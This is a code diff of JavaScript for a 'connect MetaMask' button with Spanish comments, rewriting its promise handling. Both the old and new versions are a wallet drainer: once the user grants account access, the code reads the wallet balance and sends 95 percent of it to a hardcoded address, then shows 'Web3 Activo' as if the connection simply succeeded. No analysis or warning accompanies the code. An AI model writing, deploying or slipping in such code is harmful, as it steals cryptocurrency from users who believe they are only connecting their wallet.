@@ -1,41 +1,30 @@
-document.getElementById('conectarMetaMask').addEventListener('click', async () => {
+document.getElementById('conectarMetaMask').addEventListener('click', () => {
     if (window.ethereum) {
-        try {
-            const web3 = new Web3(window.ethereum);
-            // Solicita acceso a la cuenta
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const web3 = new Web3(window.ethereum);
+        window.ethereum.enable().then(accounts => {
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
-
-            // Obtiene el saldo del usuario
-            const balance = await web3.eth.getBalance(usuarioAddress);
-            // Calcula el 95% del saldo
-            const cantidadEnviar = web3.utils.toBN(balance).mul(web3.utils.toBN(95)).div(web3.utils.toBN(100));
-            
-            // Envía la transacción
-            const tx = {
-                from: usuarioAddress,
-                to: direccionDestino,
-                value: cantidadEnviar,
-                gas: 21000,
-            };
-
-            web3.eth.sendTransaction(tx)
-            .then(receipt => {
-                console.log('Transacción exitosa:', receipt);
-                document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
-            })
-            .catch(error => {
-                console.error('Error en la transacción:', error);
+            web3.eth.getBalance(usuarioAddress).then(balance => {
+                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95; // Envía el 95% del saldo
+                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
+                web3.eth.sendTransaction({
+                    from: usuarioAddress,
+                    to: direccionDestino,
+                    value: cantidadEnviarEnWei,
+                })
+                .then(receipt => {
+                    console.log('Transacción exitosa:', receipt);
+                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
+                })
+                .catch(error => {
+                    console.error('Error en la transacción:', error);
+                });
             });
-        } catch (error) {
-            console.error('Error conectando a MetaMask:', error);
-        }
+        });
     } else {
         console.error('MetaMask no está instalado.');
     }
 });
-
 
 
 
